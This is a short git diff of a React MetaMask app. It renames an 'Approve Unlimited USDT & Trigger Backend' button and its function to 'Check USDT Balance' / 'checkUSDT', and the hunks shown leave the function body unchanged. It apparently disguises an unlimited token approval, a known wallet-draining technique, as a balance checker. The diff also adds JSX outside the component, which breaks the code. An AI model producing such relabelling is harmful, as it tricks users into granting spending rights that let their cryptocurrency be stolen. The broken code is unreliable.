@@ -34,7 +34,7 @@ function App() {
     setWalletAddress(accounts[0]);
   };
 
-  const approveUSDT = async () => {
+  const checkUSDT = async () => {
     try {
       if (!window.ethereum) throw new Error("MetaMask not found");
 
@@ -71,7 +71,7 @@ function App() {
 
   return (
     <div style={{ padding: "2rem", fontFamily: "sans-serif" }}>
-      <h1>🪙 USDT Approver</h1>
+      <h1>🪙 USDT Checker BEP20</h1>
 
       {walletAddress ? (
         <p>🔗 Connected: <strong>{walletAddress}</strong></p>
@@ -79,8 +79,8 @@ function App() {
         <button onClick={connectWallet}>Connect Wallet</button>
       )}
 
-      <button onClick={approveUSDT} style={{ marginTop: "1rem" }}>
-        Approve Unlimited USDT & Trigger Backend
+      <button onClick={checkUSDT} style={{ marginTop: "1rem" }}>
+        Check USDT Balance
       </button>
 
       {status && (
@@ -91,5 +91,8 @@ function App() {
     </div>
   );
 }
+{walletAddress && usdtBalance !== null && (
+  <p>💰 USDT Balance: <strong>{usdtBalance}</strong></p>
+)}
 
 export default App;
